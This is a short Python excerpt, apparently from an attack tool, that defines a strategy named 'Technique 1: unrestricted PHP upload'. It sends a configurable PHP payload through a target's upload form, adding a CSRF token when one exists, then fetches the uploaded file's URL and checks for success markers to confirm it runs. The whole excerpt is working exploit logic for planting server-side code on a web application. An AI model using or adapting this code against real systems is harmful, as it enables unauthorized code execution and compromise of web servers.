...
class DirectStrategy(Strategy):
    ...
    def run(self, session, csrf, config, logger):
        logger.info("Technique 1: unrestricted PHP upload")
        data = {config.UPLOAD_USER_FIELD: config.UPLOAD_USERNAME}
        if csrf: data[config.UPLOAD_CSRF_FIELD] = csrf
        files = {config.UPLOAD_FILE_FIELD: (config.DIRECT_FILENAME, config.PHP_PAYLOAD.encode(), config.DIRECT_CONTENT_TYPE)}
        try:
            ...
            verify_url = build_url(config.TARGET, config.DIRECT_VERIFY_URL)
            v = session.get(verify_url, timeout=config.TIMEOUT, verify=config.VERIFY_TLS, allow_redirects=config.FOLLOW_REDIRECTS)
            return marker_result(self.name, v, verify_url, config.SUCCESS_MARKER, config.END_MARKER, config.DIRECT_FILENAME)
